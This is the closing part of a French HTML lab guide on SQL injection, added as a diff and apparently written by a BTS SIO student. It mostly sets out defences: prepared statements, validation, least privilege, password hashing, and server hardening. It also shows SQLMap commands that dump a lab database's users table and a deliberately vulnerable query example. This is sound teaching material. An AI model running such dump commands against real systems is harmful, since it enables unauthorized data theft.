+</p>
+
+<div class="two-col">
+  <div class="card">
+    <h4 style="color:#ef4444; margin-top:0;">Vulnerable</h4>
+<pre><code>// JAMAIS : concatenation directe
+$sql = "SELECT * FROM users
+        WHERE id = $id";
+$result = $conn-&gt;query($sql);</code></pre>
+  </div>
+  <div class="card">
+    <h4 style="color:#22c55e; margin-top:0;">Sécurisé (PDO)</h4>
+<pre><code>// TOUJOURS : requete preparee
+$stmt = $pdo-&gt;prepare(
+    "SELECT * FROM users WHERE id = :id"
+);
+$stmt-&gt;execute(['id' =&gt; $id]);</code></pre>
+  </div>
+</div>
+
+<div class="tip">
+  <strong>Règle :</strong> Si vous écrivez une requête SQL qui contient une variable provenant de l'utilisateur et que vous n'utilisez pas de requête préparée, c'est une faille de sécurité.
+</div>
+
+<!-- 5.2 -->
+<h3 id="bp2">5.2 Valider toutes les entrées utilisateur</h3>
+
+<p>
+  Même avec des requêtes préparées, la validation des entrées est une couche de défense supplémentaire indispensable. Chaque paramètre doit être validé selon son type attendu.
+</p>
+
+<pre><code>&lt;?php
+// Validation d'un identifiant numerique
+$id = intval($_GET['id']);  // Force la conversion en entier
+
+// Validation avec filter_input (plus robuste)
+$id = filter_input(INPUT_GET, 'id', FILTER_VALIDATE_INT, [
+    'options' =&gt; ['min_range' =&gt; 1, 'max_range' =&gt; 999999]
+]);
+
+// Validation d'un email
+$email = filter_input(INPUT_POST, 'email', FILTER_VALIDATE_EMAIL);
+
+// Validation d'un nom avec regex (lettres, espaces, tirets uniquement)
+$name = $_POST['name'];
+if (!preg_match('/^[a-zA-ZÀ-ÿ\s\-]{2,50}$/', $name)) {
+    die("Nom invalide.");
+}
+
+// Validation d'un tri (whitelist)
+$allowed_sort = ['name', 'date', 'price'];
+$sort = in_array($_GET['sort'], $allowed_sort) ? $_GET['sort'] : 'name';
+?&gt;</code></pre>
+
+<table>
+  <thead>
+    <tr><th>Type de donnée</th><th>Méthode de validation</th><th>Exemple</th></tr>
+  </thead>
+  <tbody>
+    <tr><td>Entier</td><td><span class="inline-code">intval()</span> / <span class="inline-code">FILTER_VALIDATE_INT</span></td><td>id, quantité, page</td></tr>
+    <tr><td>Email</td><td><span class="inline-code">FILTER_VALIDATE_EMAIL</span></td><td>adresse email</td></tr>
+    <tr><td>Texte libre</td><td>Regex + longueur max</td><td>nom, commentaire</td></tr>
+    <tr><td>Choix fixe</td><td>Whitelist (<span class="inline-code">in_array</span>)</td><td>tri, catégorie, rôle</td></tr>
+  </tbody>
+</table>
+
+<!-- 5.3 -->
+<h3 id="bp3">5.3 Principe du moindre privilège</h3>
+
+<p>
+  L'utilisateur de base de données utilisé par l'application ne doit avoir que les <strong>droits strictement nécessaires</strong>. Ne jamais utiliser <span class="inline-code">root</span> ou un compte avec tous les privilèges.
+</p>
+
+<pre><code>-- Utilisateur en lecture seule (pour les pages d'affichage)
+CREATE USER 'app_read'@'localhost' IDENTIFIED BY 'pass_strong_read';
+GRANT SELECT ON tp_sqli.* TO 'app_read'@'localhost';
+
+-- Utilisateur en lecture/ecriture (pour les formulaires)
+CREATE USER 'app_write'@'localhost' IDENTIFIED BY 'pass_strong_write';
+GRANT SELECT, INSERT, UPDATE ON tp_sqli.* TO 'app_write'@'localhost';
+
+-- JAMAIS accorder ces privileges a l'application :
+-- DROP, ALTER, CREATE, FILE, GRANT, SUPER, PROCESS, SHUTDOWN</code></pre>
+
+<div class="info">
+  <strong>Impact :</strong> Si un attaquant réussit une injection malgré tout, les dégâts sont limités par les droits de l'utilisateur SQL. Avec un compte <span class="inline-code">SELECT</span> uniquement, il ne peut ni modifier ni supprimer de données.
+</div>
+
+<!-- 5.4 -->
+<h3 id="bp4">5.4 Ne jamais afficher les erreurs SQL en production</h3>
+
+<p>
+  Les messages d'erreur SQL contiennent des informations précieuses pour un attaquant : noms de tables, noms de colonnes, version du SGBD, chemin du serveur, etc.
+</p>
+
+<div class="two-col">
+  <div class="card">
+    <h4 style="color:#ef4444; margin-top:0;">Dangereux</h4>
+<pre><code>// Affiche l'erreur complete au client
+if (!$result) {
+    echo "Erreur SQL : "
+         . $conn-&gt;error;
+}</code></pre>
+    <p style="color:#ef4444; font-size:0.85rem;">Révèle la structure de la BDD</p>
+  </div>
+  <div class="card">
+    <h4 style="color:#22c55e; margin-top:0;">Sécurisé</h4>
+<pre><code>// Message generique + log serveur
+if (!$result) {
+    error_log($conn-&gt;error);
+    echo "Erreur interne.";
+}</code></pre>
+    <p style="color:#22c55e; font-size:0.85rem;">L'attaquant n'apprend rien</p>
+  </div>
+</div>
+
+<pre><code># Configuration php.ini pour la production
+display_errors = Off
+log_errors = On
+error_log = /var/log/php/errors.log
+error_reporting = E_ALL</code></pre>
+
+<!-- 5.5 -->
+<h3 id="bp5">5.5 Échappement dans les contextes dynamiques</h3>
+
+<p>
+  Les requêtes préparées ne couvrent pas tous les cas. Certains éléments SQL ne peuvent pas être paramétrés : <strong>noms de colonnes</strong>, <strong>ORDER BY</strong>, <strong>LIMIT</strong>, <strong>noms de tables</strong>. Dans ces cas, utiliser une <strong>whitelist</strong>.
+</p>
+
+<pre><code>&lt;?php
+// ORDER BY dynamique → WHITELIST obligatoire
+$allowed_columns = ['username', 'email', 'created_at'];
+$sort_column = in_array($_GET['sort'], $allowed_columns)
+    ? $_GET['sort']
+    : 'created_at';  // valeur par defaut securisee
+
+$sort_order = ($_GET['order'] === 'desc') ? 'DESC' : 'ASC';
+
+$stmt = $pdo-&gt;prepare(
+    "SELECT * FROM users ORDER BY {$sort_column} {$sort_order} LIMIT :limit OFFSET :offset"
+);
+$stmt-&gt;bindValue(':limit', (int)$_GET['limit'], PDO::PARAM_INT);
+$stmt-&gt;bindValue(':offset', (int)$_GET['offset'], PDO::PARAM_INT);
+$stmt-&gt;execute();
+
+// LIMIT et OFFSET : utiliser bindValue avec PDO::PARAM_INT
+// Noms de colonnes/tables : JAMAIS dans un placeholder, toujours whitelist
+?&gt;</code></pre>
+
+<div class="warning">
+  <strong>Piège courant :</strong> Certains développeurs pensent que <span class="inline-code">$pdo-&gt;prepare("SELECT * FROM users ORDER BY :col")</span> fonctionne, mais les noms de colonnes dans <span class="inline-code">ORDER BY</span> ne peuvent pas être des paramètres liés. Il faut utiliser une whitelist.
+</div>
+
+<!-- 5.6 -->
+<h3 id="bp6">5.6 Logs sécurisés</h3>
+
+<p>
+  Les logs applicatifs sont essentiels pour détecter et analyser les tentatives d'attaque, mais ils doivent être configurés avec soin pour ne pas devenir eux-mêmes une vulnérabilité.
+</p>
+
+<pre><code>&lt;?php
+// BON : logger l'evenement sans donnees sensibles
+function logSecurityEvent(string $event, string $ip, string $details): void {
+    $timestamp = date('Y-m-d H:i:s');
+    $logEntry = "[{$timestamp}] [{$ip}] {$event} - {$details}";
+    error_log($logEntry, 3, '/var/log/app/security.log');
+}
+
+// Exemple : tentative d'injection detectee
+logSecurityEvent(
+    'SQLI_ATTEMPT',
+    $_SERVER['REMOTE_ADDR'],
+    'Caracteres suspects dans le parametre id'
+);
+
+// MAUVAIS : ne JAMAIS logger les mots de passe ou donnees sensibles
+// error_log("Login attempt: user=$username, pass=$password");  // INTERDIT
+// error_log("SQL: SELECT * FROM users WHERE pass='$password'"); // INTERDIT
+?&gt;</code></pre>
+
+<ul>
+  <li>Ne <strong>jamais</strong> logger les mots de passe (en clair ou hachés)</li>
+  <li>Ne <strong>jamais</strong> logger les tokens de session ou les clés API</li>
+  <li>Logger les <strong>adresses IP</strong>, les <strong>horodatages</strong> et les <strong>types d'événements</strong></li>
+  <li>Protéger les fichiers de log (permissions <span class="inline-code">640</span>, rotation automatique)</li>
+  <li>Mettre en place une <strong>alerte</strong> sur les patterns d'attaque détectés</li>
+</ul>
+
+<!-- 5.7 -->
+<h3 id="bp7">5.7 Hachage moderne des mots de passe</h3>
+
+<p>
+  Même avec les meilleures protections contre l'injection SQL, un vol de base de données reste possible (fuite, backup exposé, accès physique). Le hachage des mots de passe est la <strong>dernière ligne de défense</strong>.
+</p>
+
+<pre><code>&lt;?php
+// HACHER un mot de passe (a l'inscription ou au changement)
+$password = $_POST['password'];
+
+// Option 1 : BCRYPT (par defaut, recommande)
+$hash = password_hash($password, PASSWORD_BCRYPT, ['cost' =&gt; 12]);
+// Resultat : $2y$12$... (60 caracteres)
+
+// Option 2 : ARGON2ID (meilleur, si disponible PHP 7.3+)
+$hash = password_hash($password, PASSWORD_ARGON2ID, [
+    'memory_cost' =&gt; 65536,  // 64 Mo
+    'time_cost'   =&gt; 4,      // 4 iterations
+    'threads'     =&gt; 3,      // 3 threads
+]);
+// Resultat : $argon2id$v=19$... (97 caracteres)
+
+// VERIFIER un mot de passe (a la connexion)
+if (password_verify($password, $hash_from_db)) {
+    // Mot de passe correct
+    // Verifier si le hash doit etre mis a jour
+    if (password_needs_rehash($hash_from_db, PASSWORD_ARGON2ID)) {
+        $new_hash = password_hash($password, PASSWORD_ARGON2ID);
+        // UPDATE users SET password = $new_hash WHERE id = ...
+    }
+} else {
+    // Mot de passe incorrect
+}
+?&gt;</code></pre>
+
+<div class="card">
+  <table>
+    <thead>
+      <tr><th>Algorithme</th><th>Statut</th><th>Temps de cassage</th></tr>
+    </thead>
+    <tbody>
+      <tr>
+        <td><span class="inline-code">MD5</span></td>
+        <td style="color:#ef4444;">Interdit</td>
+        <td>Instantané (rainbow tables, GPU)</td>
+      </tr>
+      <tr>
+        <td><span class="inline-code">SHA1</span> / <span class="inline-code">SHA256</span></td>
+        <td style="color:#ef4444;">Interdit</td>
+        <td>Quelques secondes a minutes (GPU)</td>
+      </tr>
+      <tr>
+        <td><span class="inline-code">BCRYPT</span></td>
+        <td style="color:#22c55e;">Recommandé</td>
+        <td>Heures à années (selon cost et complexité)</td>
+      </tr>
+      <tr>
+        <td><span class="inline-code">ARGON2ID</span></td>
+        <td style="color:#22c55e;">Idéal</td>
+        <td>Très résistant (mémoire + CPU + parallélisme)</td>
+      </tr>
+    </tbody>
+  </table>
+</div>
+
+<div class="warning">
+  <strong>Règle absolue :</strong> Ne <strong>jamais</strong> utiliser MD5 ou SHA1 pour les mots de passe. Utiliser <span class="inline-code">password_hash()</span> et <span class="inline-code">password_verify()</span> en PHP. Ne jamais inventer son propre système de hachage.
+</div>
+
+<!-- 5.8 -->
+<h3 id="bp8">5.8 Configuration sécurisée du serveur SQL</h3>
+
+<p>
+  Le serveur MySQL/MariaDB lui-même doit être sécurisé pour limiter la surface d'attaque en cas de compromission de l'application.
+</p>
+
+<pre><code># /etc/mysql/mysql.conf.d/mysqld.cnf
+
+[mysqld]
+# Changer le port par defaut (3306 → autre)
+port = 3307
+
+# Ecouter uniquement sur localhost (pas d'acces reseau externe)
+bind-address = 127.0.0.1
+
+# Desactiver le chargement de fichiers locaux (prevention de FILE injection)
+local-infile = 0
+
+# Desactiver les liens symboliques
+symbolic-links = 0
+
+# Limiter les connexions simultanees
+max_connections = 100
+
+# Journalisation des requetes lentes (detection d'anomalies)
+slow_query_log = 1
+slow_query_log_file = /var/log/mysql/slow.log
+long_query_time = 2</code></pre>
+
+<p>Sécurisation supplémentaire avec le pare-feu :</p>
+
+<pre><code># Bloquer tout acces externe au port MySQL
+sudo ufw deny 3307/tcp
+
+# Autoriser uniquement depuis le serveur web local
+sudo ufw allow from 127.0.0.1 to any port 3307
+
+# Verifier les regles
+sudo ufw status</code></pre>
+
+<ul>
+  <li><strong>Changer le port par défaut</strong> : complique les scans automatisés</li>
+  <li><strong>bind-address = 127.0.0.1</strong> : empêche les connexions distantes</li>
+  <li><strong>local-infile = 0</strong> : empêche l'exploitation de <span class="inline-code">LOAD DATA LOCAL INFILE</span></li>
+  <li><strong>Pare-feu</strong> : couche de protection réseau supplémentaire</li>
+  <li><strong>Mises à jour régulières</strong> : appliquer les patchs de sécurité MySQL</li>
+</ul>
+
+<!-- 5.9 -->
+<h3 id="bp9">5.9 Défense en profondeur</h3>
+
+<p>
+  La <strong>défense en profondeur</strong> est un principe de sécurité qui consiste à superposer plusieurs couches de protection indépendantes. Si une couche est compromise, les suivantes continuent de protéger le système.
+</p>
+
+<div class="card">
+  <table>
+    <thead>
+      <tr><th>Couche</th><th>Protection</th><th>Exemple</th></tr>
+    </thead>
+    <tbody>
+      <tr>
+        <td><strong>1. Réseau</strong></td>
+        <td>Pare-feu, segmentation</td>
+        <td>UFW, iptables, VLAN</td>
+      </tr>
+      <tr>
+        <td><strong>2. Transport</strong></td>
+        <td>Chiffrement des communications</td>
+        <td>HTTPS/TLS, connexion MySQL chiffrée</td>
+      </tr>
+      <tr>
+        <td><strong>3. Application (WAF)</strong></td>
+        <td>Filtrage des requêtes HTTP</td>
+        <td>ModSecurity, Cloudflare WAF</td>
+      </tr>
+      <tr>
+        <td><strong>4. Code applicatif</strong></td>
+        <td>Requêtes préparées, validation</td>
+        <td>PDO, filter_input, whitelist</td>
+      </tr>
+      <tr>
+        <td><strong>5. Base de données</strong></td>
+        <td>Moindre privilège, configuration</td>
+        <td>Utilisateur restreint, bind 127.0.0.1</td>
+      </tr>
+      <tr>
+        <td><strong>6. Donnees</strong></td>
+        <td>Chiffrement, hachage</td>
+        <td>bcrypt/ARGON2ID, AES pour les données sensibles</td>
+      </tr>
+      <tr>
+        <td><strong>7. Surveillance</strong></td>
+        <td>Détection et alerte</td>
+        <td>Logs, SIEM, alertes temps réel</td>
+      </tr>
+    </tbody>
+  </table>
+</div>
+
+<div class="tip">
+  <strong>Principe clé :</strong> Ne jamais se reposer sur une seule mesure de sécurité. Chaque couche doit fonctionner comme si les autres n'existaient pas. Une requête préparée protège contre l'injection, mais le moindre privilège limite les dégâts si elle échoue, et le WAF peut bloquer l'attaque avant qu'elle n'atteigne le code.
+</div>
+
+<!-- 5.10 -->
+<h3 id="bp10">5.10 Suivre les standards OWASP</h3>
+
+<p>
+  L'<strong>OWASP</strong> (Open Worldwide Application Security Project) est la référence mondiale en matière de sécurité applicative. Ses ressources sont gratuites et régulièrement mises à jour.
+</p>
+
+<ul>
+  <li><strong>OWASP Top 10</strong> : les 10 vulnérabilités les plus critiques (A01 à A10)</li>
+  <li><strong>OWASP ASVS</strong> (Application Security Verification Standard) : checklist de sécurité détaillée par niveau</li>
+  <li><strong>OWASP Cheat Sheets</strong> : guides pratiques par technologie (SQL Injection Prevention, Authentication, etc.)</li>
+  <li><strong>OWASP Testing Guide</strong> : méthodologie de test de pénétration</li>
+  <li><strong>OWASP SAMM</strong> : modèle de maturité pour intégrer la sécurité dans le cycle de développement</li>
+</ul>
+
+<div class="card">
+  <h4 style="margin-top:0;">OWASP Top 10 &mdash; 2021</h4>
+  <table>
+    <thead>
+      <tr><th>Rang</th><th>Catégorie</th><th>Rapport avec SQLi</th></tr>
+    </thead>
+    <tbody>
+      <tr><td>A01</td><td>Broken Access Control</td><td>SQLi peut contourner les contrôles d'accès</td></tr>
+      <tr><td>A02</td><td>Cryptographic Failures</td><td>Exfiltration de hash faibles via SQLi</td></tr>
+      <tr><td><strong>A03</strong></td><td><strong>Injection</strong></td><td><strong>Catégorie directe de SQLi</strong></td></tr>
+      <tr><td>A04</td><td>Insecure Design</td><td>Absence de validation par design</td></tr>
+      <tr><td>A05</td><td>Security Misconfiguration</td><td>Erreurs SQL affichées, root en prod</td></tr>
+    </tbody>
+  </table>
+</div>
+
+<div class="info">
+  <strong>Recommandation BTS SIO :</strong> Consulter régulièrement les <strong>OWASP Cheat Sheets</strong> et intégrer le <strong>OWASP Top 10</strong> dans chaque projet. Citer ces références dans les documentations de projet renforce la crédibilité professionnelle.
+</div>
+
+<!-- 5.11 -->
+<h3 id="bp11">5.11 Tests réguliers</h3>
+
+<p>
+  La sécurité n'est pas un état, c'est un <strong>processus continu</strong>. Des tests réguliers permettent de détecter les vulnérabilités avant les attaquants.
+</p>
+
+<div class="card">
+  <table>
+    <thead>
+      <tr><th>Outil</th><th>Type</th><th>Usage</th></tr>
+    </thead>
+    <tbody>
+      <tr>
+        <td><strong>SQLMap</strong></td>
+        <td>Scanner SQLi automatisé</td>
+        <td>Détection et exploitation automatique de toutes les variantes SQLi</td>
+      </tr>
+      <tr>
+        <td><strong>OWASP ZAP</strong></td>
+        <td>Scanner de vulnérabilités web</td>
+        <td>Scan automatique complet (SQLi, XSS, CSRF, etc.)</td>
+      </tr>
+      <tr>
+        <td><strong>Burp Suite</strong></td>
+        <td>Proxy d'interception</td>
+        <td>Tests manuels avancés, modification de requêtes en temps réel</td>
+      </tr>
+    </tbody>
+  </table>
+</div>
+
+<pre><code># SQLMap : test automatise d'injection SQL
+sqlmap -u "http://192.168.200.130/index.php?id=1" --batch --dbs
+
+# SQLMap : extraction des tables d'une base
+sqlmap -u "http://192.168.200.130/index.php?id=1" --batch -D tp_sqli --tables
+
+# SQLMap : extraction des donnees d'une table
+sqlmap -u "http://192.168.200.130/index.php?id=1" --batch -D tp_sqli -T users --dump
+
+# OWASP ZAP : scan en ligne de commande
+zap-cli quick-scan http://192.168.200.130/
+
+# Nikto : scan de vulnerabilites du serveur web
+nikto -h http://192.168.200.130/</code></pre>
+
+<p>
+  Les tests doivent être réalisés :
+</p>
+<ul>
+  <li>À chaque <strong>nouvelle fonctionnalité</strong> touchant la base de données</li>
+  <li>À chaque <strong>mise à jour</strong> majeure du framework ou du SGBD</li>
+  <li>Au minimum <strong>une fois par trimestre</strong> en production</li>
+  <li>Après tout <strong>incident de sécurité</strong></li>
+</ul>
+
+<!-- 5.12 -->
+<h3 id="bp12">5.12 Tableau récapitulatif</h3>
+
+<div class="card">
+  <table>
+    <thead>
+      <tr><th style="width:40%;">Rappel</th><th>Pourquoi</th></tr>
+    </thead>
+    <tbody>
+      <tr>
+        <td>Toujours utiliser des requêtes préparées</td>
+        <td>Empêche structurellement l'injection en séparant code SQL et données</td>
+      </tr>
+      <tr>
+        <td>Valider toutes les entrées utilisateur</td>
+        <td>Rejette les données malformées avant qu'elles n'atteignent la requête</td>
+      </tr>
+      <tr>
+        <td>Appliquer le moindre privilège</td>
+        <td>Limite les dégâts si une injection réussit malgré tout</td>
+      </tr>
+      <tr>
+        <td>Masquer les erreurs SQL en production</td>
+        <td>Empêche l'attaquant de cartographier la base par les messages d'erreur</td>
+      </tr>
+      <tr>
+        <td>Whitelist pour ORDER BY / LIMIT</td>
+        <td>Ces clauses ne supportent pas les paramètres liés, la whitelist est obligatoire</td>
+      </tr>
+      <tr>
+        <td>Sécuriser les logs</td>
+        <td>Évite la fuite de données sensibles via les fichiers de journalisation</td>
+      </tr>
+      <tr>
+        <td>Utiliser bcrypt ou ARGON2ID</td>
+        <td>Protège les mots de passe même en cas de vol de la base de données</td>
+      </tr>
+      <tr>
+        <td>Configurer le serveur SQL</td>
+        <td>Réduit la surface d'attaque (port, bind, local-infile, pare-feu)</td>
+      </tr>
+      <tr>
+        <td>Defense en profondeur (7 couches)</td>
+        <td>Chaque couche compense les éventuelles failles des autres</td>
+      </tr>
+      <tr>
+        <td>Suivre les standards OWASP</td>
+        <td>Référence mondiale, checklists éprouvées, crédibilité professionnelle</td>
+      </tr>
+      <tr>
+        <td>Tester régulièrement</td>
+        <td>Détecte les vulnérabilités avant les attaquants (SQLMap, ZAP, Burp)</td>
+      </tr>
+      <tr>
+        <td>Former les développeurs</td>
+        <td>La sécurité commence par la connaissance : un développeur informé écrit du code sécurisé</td>
+      </tr>
+    </tbody>
+  </table>
+</div>
+
+<!-- ================================================================ -->
+<!-- 6. CONCLUSION                                                      -->
+<!-- ================================================================ -->
+
+<h2 id="conclusion">6. Conclusion</h2>
+
+<p>
+  Ce guide a permis de démontrer, dans un environnement de laboratoire contrôlé, les différentes techniques d'injection SQL : de l'injection simple par commentaires jusqu'aux attaques Time-Based Blind les plus sophistiquées. Chaque technique a été testée manuellement avec <span class="inline-code">curl</span> depuis Kali Linux contre une application PHP volontairement vulnérable sur Lubuntu.
+</p>
+
+<p>
+  Les résultats sont sans appel : <strong>une seule ligne de code vulnérable suffit</strong> pour compromettre l'intégralité d'une base de données. L'attaquant peut lire les mots de passe hachés, énumérer les tables, vérifier l'existence de données et même extraire des informations caractère par caractère sans aucun retour visuel.
+</p>
+
+<p>
+  La correction est pourtant simple : l'utilisation systématique de <strong>requêtes préparées avec PDO</strong> rend l'injection structurellement impossible. Combinée avec la validation des entrées, le principe du moindre privilège, une configuration serveur sécurisée et une approche de défense en profondeur, cette protection constitue un rempart solide.
+</p>
+
+<p>
+  En tant qu'étudiant BTS SIO option SLAM, ce TP illustre des compétences directement applicables en milieu professionnel : la capacité à identifier une vulnérabilité, à la reproduire pour en comprendre le mécanisme, et surtout à proposer et implémenter les corrections adaptées. La sécurité n'est pas une option, c'est une responsabilité de chaque développeur.
+</p>
+
+<div class="tip">
+  <strong>Retenir :</strong> Requêtes préparées + validation des entrées + moindre privilège + défense en profondeur = la base de toute application sécurisée.
+</div>
+
+<!-- ================================================================ -->
+<!-- LIENS UTILES                                                       -->
+<!-- ================================================================ -->
+
+<h2>Liens utiles</h2>
+
+<div class="two-col">
+  <div class="card">
+    <h4 style="margin-top:0;">OWASP</h4>
+    <ul>
+      <li><a href="https://owasp.org/www-project-top-ten/" target="_blank">OWASP Top 10</a> &mdash; Classement des vulnérabilités web les plus critiques</li>
+      <li><a href="https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html" target="_blank">SQL Injection Prevention Cheat Sheet</a> &mdash; Guide de prévention OWASP</li>
+    </ul>
+  </div>
+  <div class="card">
+    <h4 style="margin-top:0;">Outils</h4>
+    <ul>
+      <li><a href="https://sqlmap.org/" target="_blank">SQLMap</a> &mdash; Outil automatisé de détection et exploitation SQLi</li>
+      <li><a href="https://portswigger.net/web-security/sql-injection" target="_blank">PortSwigger Web Security Academy</a> &mdash; Labs interactifs SQLi</li>
+    </ul>
+  </div>
+  <div class="card">
+    <h4 style="margin-top:0;">Documentation PHP</h4>
+    <ul>
+      <li><a href="https://www.php.net/manual/fr/book.pdo.php" target="_blank">PHP PDO</a> &mdash; Documentation officielle des requêtes préparées</li>
+      <li><a href="https://www.php.net/manual/fr/function.password-hash.php" target="_blank">password_hash()</a> &mdash; Hachage sécurisé des mots de passe</li>
+    </ul>
+  </div>
+  <div class="card">
+    <h4 style="margin-top:0;">Apprentissage</h4>
+    <ul>
+      <li><a href="https://owasp.org/www-project-web-security-testing-guide/" target="_blank">OWASP Testing Guide</a> &mdash; Méthodologie de test de pénétration</li>
+      <li><a href="https://portswigger.net/burp" target="_blank">Burp Suite</a> &mdash; Proxy d'interception pour tests de sécurité</li>
+    </ul>
+  </div>
+</div>
+
+<!-- ================================================================ -->
+<!-- FOOTER                                                             -->
+<!-- ================================================================ -->
+
+<div class="footer">
+  Guide technique &mdash; Injection SQL &mdash; Sagar MIR &mdash; 2025
+</div>
+
+</div>
+</body>
+</html>
